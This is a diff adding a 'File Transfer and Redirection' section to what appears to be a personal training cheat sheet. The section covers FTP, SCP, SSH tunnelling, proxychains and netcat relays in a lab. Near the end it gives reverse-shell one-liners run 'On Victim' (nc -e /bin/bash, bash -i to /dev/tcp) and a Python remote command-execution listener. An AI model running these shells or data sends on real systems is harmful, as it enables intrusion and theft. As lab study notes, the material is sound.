@@ -6938,3 +6938,480 @@ Ports: x,x,x,x
 
 
 
+
+# File Transfer and Redirection
+## Common Transfering Data Methods
+
+TFTP
+
+FTP ACtive and Passive
+
+FTPS
+
+SFTP
+
+SCP
+
+
+## FTP Active  (CMD)
+For Anonymous
+```
+bob@bob-host:~$ ftp 10.0.0.104
+Connected to 10.0.0.104.
+220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
+Name (10.0.0.104:bob): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: (no password)
+230-Welcome, archive user anonymous@10.0.0.101 !
+230-
+230-The local time is: Fri May 03 15:46:43 2024
+230-
+230-This is an experimental FTP server.  If you have any unusual problems,
+230-please report them via e-mail to <root@james-host.novalocal>.
+230-
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
+-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
+-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
+226 Transfer complete
+ftp>
+
+```
+
+For User
+```
+bob@bob-host:~$ ftp 10.0.0.104
+Connected to 10.0.0.104.
+220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
+Name (10.0.0.104:bob): james
+331 Password required for james
+Password: (password)
+230 User james logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+226 Transfer complete
+ftp>
+```
+
+
+## FTP Passive (CMD)
+
+With WGET
+```
+student@blue-internet-host:~$ proxychains wget -r ftp://10.0.0.104
+ProxyChains-3.1 (http://proxychains.sf.net)
+--2024-05-03 15:09:01--  ftp://10.0.0.104/
+           => ‘10.0.0.104/.listing’
+Connecting to 10.0.0.104:21... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
+connected.
+Logging in as anonymous ... Logged in!
+==> SYST ... done.    ==> PWD ... done.
+==> TYPE I ... done.  ==> CWD not needed.
+==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:32857-<><>-OK
+done.    ==> LIST ... done.
+
+{output omitted}
+
+FINISHED --2024-05-03 15:09:01--
+Total wall clock time: 0.03s
+Downloaded: 3 files, 8.4K in 0s (23.5 MB/s)
+
+```
+
+For Anomynous
+```
+
+student@blue-internet-host:~$ proxychains ftp 10.0.0.104
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
+Connected to 10.0.0.104.
+220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
+Name (10.0.0.104:student): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: (no password)
+230-Welcome, archive user anonymous@10.0.0.101 !
+230-
+230-The local time is: Fri May 03 17:20:09 2024
+230-
+230-This is an experimental FTP server.  If you have any unusual problems,
+230-please report them via e-mail to <root@james-host.novalocal>.
+230-
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> passive
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (10,0,0,104,162,147).
+|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:41619-<><>-OK
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
+-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
+-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
+226 Transfer complete
+ftp>
+```
+
+Passive for USER
+
+```
+student@blue-internet-host:~$ proxychains ftp 10.0.0.104
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
+Connected to 10.0.0.104.
+220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
+Name (10.0.0.104:student): james
+331 Password required for james
+Password: (password)
+230 User james logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+500 Illegal PORT command
+ftp: bind: Address already in use
+ftp> passive
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (10,0,0,104,168,167).
+|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:43175-<><>-OK
+150 Opening ASCII mode data connection for file list
+226 Transfer complete
+ftp>
+```
+
+
+## SCP Options + Syntax (CMD)
+
+Options
+
+. present working directory
+
+-v Verbose Mode
+
+-P Alternate Port
+
+-r Recursively Copy
+
+-3 3-way Copy
+
+HOW TO USE
+```
+scp user@IP.ADD.RR.SS:whatyouwant.txt whereyouwantit
+```
+Download a file from a remote directory to a local directory
+```
+	$ scp student@172.16.82.106:secretstuff.txt /home/student
+```
+
+
+Upload a file to a remote directory from a local directory
+```
+	$ scp secretstuff.txt student@172.16.82.106:/home/student
+```
+
+
+Copy a file from a remote host to a separate remote host
+```
+	$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+	password:    password:
+```
+
+Recursive upload of a folder to remote
+```
+	$ scp -r folder/ student@172.16.82.106:
+```
+
+
+Recursive download of a folder from remote
+```
+	$ scp -r student@172.16.82.106:folder/ .
+```
+
+
+## SCP Alternate SSHD (CMD)
+
+
+SCP Syntax w/ alternate SSHD
+
+Download a file from a remote directory to a local directory
+```
+$ scp -P 1111 student@172.16.82.106:secretstuff.txt .
+```
+
+Upload a file to a remote directory from a local directory
+```
+$ scp -P 1111 secretstuff.txt student@172.16.82.106:
+```
+
+
+## SCP Through a TUNNEL (CMD)
+
+```
+Create a local port forward to target device
+
+$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+
+Download a file from a remote directory to a local directory
+
+$ scp -P 1111 student@localhost:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory
+
+$ scp -P 1111 secretstuff.txt student@localhost:/home/student
+```
+
+## SCP Through Dynamic Port Forwarding (CMD)
+
+```
+SCP Syntax through a Dynamic Port forward
+Create a Dynamic Port Forward to target device
+
+$ ssh student@172.16.82.106 -D 9050 -NT
+
+Download a file from a remote directory to a local directory
+
+$ proxychains scp student@localhost:secretstuff.txt .
+
+Upload a file to a remote directory from a local directory
+
+$ proxychains scp secretstuff.txt student@localhost:
+```
+
+
+
+## NETCAT Transfer (CMD)
+
+NETCAT: CLIENT TO LISTENER FILE TRANSFER
+
+
+```
+    Listener (receive file):
+
+nc -lvp 9001 > newfile.txt
+
+    Client (sends file):
+
+nc 172.16.82.106 9001 < file.txt
+```
+
+NETCAT LISTENER TO CLIENT FILE TRANSFER
+
+```
+    Listener (sends file):
+
+nc -lvp 9001 < file.txt
+
+    Client (receive file):
+
+nc 172.16.82.106 9001 > newfile.txt
+
+```
+
+
+## NETCAT RELAY DEMO (CMD)
+
+**Listener - Listener**
+```
+    On Blue_Host-1 Relay:
+
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+
+    On Internet_Host (send):
+
+$ nc 172.16.82.106 1111 < secret.txt
+
+    On Blue_Priv_Host-1 (receive):
+
+$ nc 192.168.1.1 3333 > newsecret.txt
+```
+
+**Client - Client**
+```
+    On Internet_Host (send):
+
+$ nc -lvp 1111 < secret.txt
+
+    On Blue_Priv_Host-1 (receive):
+
+$ nc -lvp 3333 > newsecret.txt
+
+    On Blue_Host-1 Relay:
+
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+
+```
+
+
+**Client - Listener**
+```
+    On Internet_Host (send):
+
+$ nc -lvp 1111 < secret.txt
+
+    On Blue_Priv_Host-1 (receive):
+
+$ nc 192.168.1.1 3333 > newsecret.txt
+
+    On Blue_Host-1 Relay:
+
+$ mknod mypipe p
+$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
+```
+
+
+**Listener - Client**
+```
+    On Internet_Host (send):
+
+$ nc 172.16.82.106 1111 < secret.txt
+
+    On Blue_Priv_Host-1 (receive):
+
+$ nc -lvp 3333 > newsecret.txt
+
+    On Blue_Host-1 Relay:
+
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+```
+
+## NC DEMO 1 WAY (CMD)
+
+```
+Listener
+nc -lvp 2221 < SStext
+Listening on [any] 2221 ...
+Can you Hear Me? (1)
+
+Middleman
+nc 192.168.1.10 2221 | nc 10.10.0.40 4442
+Yes I Can (3)
+
+
+Client
+nc -lvp 4442 > file.txt
+Listening on [any] 4442 ...
+^C
+Yes I can (2)
+```
+
+## NC DEMO 2 WAY PIPE on Seperate ENDS (CMD)
+
+```
+Listener
+nc -lvp 2221
+Listening on [any] 2221 ...
+Test? (1)
+
+Middleman
+mknod MYPIPE p
+nc 192.168.1.10 2221 < MYPIPE | nc 10.10.0.40 4442 > MYPIPE
+
+Client
+nc -lvp 4442 
+Listening on [any] 4442 ...
+Yes! (2)
+```
+## NC DEMO 2 WAY PIPE using MIDDLEMAN (CMD)
+```
+Middleman
+mknod MYPIPE p
+nc -lvp 2221 < MYPIPE | nc -lvp 4442 > MYPIPE
+Listening [2221] ...
+Listening [4442] ...
+
+
+Client (1)
+nc MiddleMANIP 2221
+
+
+Client (2)
+nc MiddleMANIP 4442
+```
+
+## File Transfer with /DEV/TCP (CMD)
+
+```
+    On the receiving box:
+
+$ nc -lvp 1111 > devtcpfile.txt
+
+    On the sending box:
+
+$ cat secret.txt > /dev/tcp/10.10.0.40/1111
+
+    This method is useful for a host that does not have NETCAT available.
+```
+
+## Reverse SHELL Using NC (CMD)
+```
+    First listen for the shell on your device.
+
+$ nc -lvp 9999
+
+    On Victim using -c :
+
+$ nc -c /bin/bash 10.10.0.40 9999
+
+    On Victim using -e :
+
+$ nc -e /bin/bash 10.10.0.40 9999
+
+```
+
+## Reverse SHELL Using /DEV/TCP (CMD)
+
+```
+    First listen for the shell on your device.
+
+$ nc -lvp 9999
+
+    On Victim:
+
+$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+
+```
+
+
+## Reverse SHELL PYTHON3 (CMD)
+
+```
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+
+```
+
+## Packing and Encoding
+
+Take information and pack it with different headers, formulas, and ways to obsfuscate information.
+
+
